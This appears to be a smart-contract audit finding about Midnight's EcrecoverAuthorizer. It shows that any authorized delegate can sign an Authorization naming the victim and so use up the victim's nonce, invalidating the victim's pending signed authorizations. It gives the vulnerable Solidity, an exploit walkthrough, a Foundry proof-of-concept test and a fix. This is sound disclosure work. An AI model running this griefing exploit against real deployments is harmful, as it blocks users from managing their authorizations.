### Title
Authorized Delegate Can Consume Authorizer's EcrecoverAuthorizer Nonce via Delegated Signature — (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `IMidnight.isAuthorized(authorizer, signer)` returns `true` for, not just the authorizer themselves. Because the nonce is incremented unconditionally whenever this check passes, any authorized delegate can sign and submit an `Authorization` struct naming the victim as `authorizer`, consuming the victim's nonce and invalidating any pending victim-signed authorizations at that nonce.

### Finding Description
The vulnerable path is in `src/periphery/EcrecoverAuthorizer.sol` lines 24–36:

```solidity
function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
    require(block.timestamp <= authorization.deadline, Expired());
    require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // nonce consumed here

    ...
    address signer = ecrecover(digest, signature.v, signature.r, signature.s);
    require(signer != address(0), InvalidSignature());
    require(
        signer == authorization.authorizer
            || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer), // delegate accepted
        Unauthorized()
    );
``` [1](#0-0) 

The nonce at line 26 is incremented for `authorization.authorizer` before the signer identity is verified. The signer check at line 33–36 accepts any address for which `IMidnight.isAuthorized(victim, signer)` is `true`. On Midnight, `isAuthorized` is a flat mapping: [2](#0-1) 

**Exploit flow:**

1. Precondition: `isAuthorized[victim][attacker] == true` on Midnight; victim has also authorized `EcrecoverAuthorizer` on Midnight; victim has a pending off-chain signed `Authorization{authorizer=victim, ..., nonce=N}`.
2. Attacker constructs `Authorization{authorizer=victim, authorized=<any>, isAuthorized=<any>, nonce=N, deadline=<future>}` and signs it with the **attacker's own key**.
3. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.
4. Line 26: `N == nonce[victim]` → passes; `nonce[victim]` becomes `N+1`.
5. Line 34: `signer == victim` → false; `isAuthorized[victim][attacker]` → **true** → passes.
6. Line 46–47: `IMidnight.setIsAuthorized(authorized, isAuthorized, victim)` executes (succeeds because `isAuthorized[victim][EcrecoverAuthorizer] == true`).
7. Victim's nonce is now `N+1`; any pending victim-signed authorization at nonce `N` reverts with `InvalidNonce`. [3](#0-2) 

The attacker can choose `authorized` to be any third address (not themselves), so they do not lose their own authorization in the process and can repeat the attack for nonces `N+1`, `N+2`, etc., permanently blocking the victim from using `EcrecoverAuthorizer`.

The existing `testEcrecoverAuthorizerInvalidSignature` test only checks that a **completely unauthorized** signer is rejected; it does not test the case where the signer is an authorized delegate of the authorizer. [4](#0-3) 

### Impact Explanation
An attacker who holds any Midnight authorization from the victim can grief the victim's `EcrecoverAuthorizer` nonce sequence indefinitely. Any off-chain signed authorizations the victim has distributed (e.g., to revoke a malicious operator, or to grant a new one) are rendered permanently invalid. The victim cannot use the `EcrecoverAuthorizer` path to manage authorizations; they must fall back to a direct on-chain `Midnight.setIsAuthorized` call, which may not be possible if the victim is a smart contract relying solely on the EIP-712 signature flow.

### Likelihood Explanation
Preconditions are common: any user who has ever authorized an operator on Midnight (e.g., a ratifier, a keeper, or a liquidation bot) is vulnerable. The attacker only needs to be one of those authorized addresses. The attack is free (no capital required), repeatable every block, and requires no special timing. The attacker can front-run any victim-submitted `setIsAuthorized` transaction to consume the nonce first.

### Recommendation
Restrict the signer check to the authorizer only — remove the delegate path from `EcrecoverAuthorizer.setIsAuthorized`:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

The purpose of `EcrecoverAuthorizer` is to allow the authorizer to act via an off-chain signature; delegating that signing right to on-chain authorized addresses conflates two separate trust models and breaks nonce ownership.

### Proof of Concept

```solidity
// Foundry unit test
function testNonceGriefByDelegate() public {
    // Setup: victim authorizes EcrecoverAuthorizer and attacker on Midnight
    vm.prank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Victim has a pending signed authorization at nonce 0
    Authorization memory victimAuth = makeAuthorization(victim, someAddress, true); // nonce=0
    Signature memory victimSig = signAuthorization(victimAuth, victimPrivKey);

    // Attacker constructs a different auth at nonce 0, signed by attacker
    Authorization memory attackAuth = Authorization({
        authorizer: victim,
        authorized: anotherAddress, // not attacker, so attacker keeps their auth
        isAuthorized: false,
        nonce: 0,
        deadline: block.timestamp + 1000
    });
    Signature memory attackSig = signAuthorization(attackAuth, attackerPrivKey);

    // Attacker submits — should succeed
    ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig);

    // Assert: victim's nonce is now 1
    assertEq(ecrecoverAuthorizer.nonce(victim), 1);

    // Assert: victim's pending authorization at nonce 0 now reverts
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);
}
```

Expected assertions: `nonce[victim] == 1` after attacker's call; victim's original `setIsAuthorized` reverts with `InvalidNonce`.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-36)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L46-47)
```text
        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

**File:** src/Midnight.sol (L192-192)
```text
    mapping(address authorizer => mapping(address authorized => bool)) public isAuthorized;
```

**File:** test/SetIsAuthorizedWithSigTest.sol (L88-97)
```text
    function testEcrecoverAuthorizerInvalidSignature() public {
        Authorization memory auth = makeAuthorization(borrower, lender, true);
        Signature memory sig = signAuthorization(auth, lender); // wrong signer

        vm.expectRevert(IEcrecoverAuthorizer.Unauthorized.selector);
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        assertEq(midnight.isAuthorized(borrower, lender), false);
        assertEq(ecrecoverAuthorizer.nonce(borrower), 0);
    }
```
